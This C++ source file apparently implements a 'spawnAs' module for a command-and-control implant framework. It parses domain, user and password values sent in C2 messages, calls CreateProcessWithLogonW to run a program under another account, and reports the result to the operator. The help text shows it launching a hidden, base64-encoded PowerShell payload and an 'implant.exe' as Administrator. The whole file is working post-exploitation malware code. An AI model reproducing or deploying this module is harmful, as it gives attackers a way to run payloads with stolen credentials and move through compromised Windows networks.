#include "SpawnAs.hpp"

#include <cstring>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#endif

using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

const std::string moduleName = "spawnAs";


#ifdef _WIN32

__declspec(dllexport) SpawnAs* A_SpawnAsConstructor() 
{
    return new SpawnAs();
}

#endif

SpawnAs::SpawnAs()
	: ModuleCmd(moduleName)
{
}

SpawnAs::~SpawnAs()
{
}

std::string SpawnAs::getInfo()
{
	std::string info;
	info += "spawnAs:\n";
	info += "Launch a new process as another user, with the given credentials. \n";
	info += "exemple:\n";
	info += "- spawnAs DOMAIN\\Username Password powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgA...\n";
    info += "- spawnAs .\\Administrator Password C:\\Users\\Public\\Documents\\implant.exe\n";

	return info;
}

int SpawnAs::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
    if (splitedCmd.size() >= 4)
	{
        // format DOMAIN\Username Password
        string usernameDomain="";
        string password="";
        std::string username="";
        std::string domain=".";
        if(splitedCmd.size()>=3)
        {
            usernameDomain = splitedCmd[1];
            password = splitedCmd[2];
        }

        std::vector<std::string> splitedList;
        splitList(usernameDomain, "\\", splitedList);

        if(splitedList.size()==1)
        username = splitedList[0];
        else if(splitedList.size()>1)
        {
            domain = splitedList[0];
            username = splitedList[1];
        }

        std::string cmd = domain;
        cmd += ";";
        cmd += username;
        cmd += ";";
        cmd += password;


        std::string programToLaunch="";
        for (int idx = 3; idx < splitedCmd.size(); idx++) 
        {
            if(!programToLaunch.empty())
                programToLaunch+=" ";
            programToLaunch+=splitedCmd[idx];
        }
		
        c2Message.set_instruction(m_name);
        c2Message.set_cmd(cmd);
		c2Message.set_data(programToLaunch.data(), programToLaunch.size());
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}


int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	std::string cmd = c2Message.cmd();
    const std::string payload = c2Message.data();

    std::vector<std::string> splitedList;
    splitList(cmd, ";", splitedList);

    std::string domain=splitedList[0];
    std::string username=splitedList[1];
    std::string password=splitedList[2];

    std::string result;

#ifdef __linux__ 

    result += "SpawnAs don't work in linux.\n";

#elif _WIN32

    std::wstring szCmdline = std::wstring(payload.begin(), payload.end());

    PROCESS_INFORMATION piProcInfo = {0};
    STARTUPINFOW si = {0};
    si.cb = sizeof(STARTUPINFO);

    std::wstring usernameW = std::wstring(username.begin(), username.end());
    std::wstring domainW = std::wstring(domain.begin(), domain.end());
    std::wstring passwordW = std::wstring(password.begin(), password.end());
    if (!CreateProcessWithLogonW(
        usernameW.c_str(), 
        domainW.c_str(), 
        passwordW.c_str(), 
        LOGON_WITH_PROFILE, 
        NULL, 
        szCmdline.data(), 
        0, 
        NULL, 
        NULL, 
        &si, 
        &piProcInfo))
    {
        DWORD errorMessageID = ::GetLastError();
        if(errorMessageID == 0)
            return 0; 

        LPSTR messageBuffer = nullptr;
        size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                    NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
        
        std::string message(messageBuffer, size);
        LocalFree(messageBuffer);

        result += "Unable to CreateProcessWithLogonW.\n";
        result += message;
        cmd += " ";
        cmd += payload;
        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 0;
    }

    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

#endif

    result += "Success.\n";

	c2RetMessage.set_instruction(m_name);
    cmd += " ";
    cmd += payload;
	c2RetMessage.set_cmd(cmd);
	c2RetMessage.set_returnvalue(result);
	return 0;
}

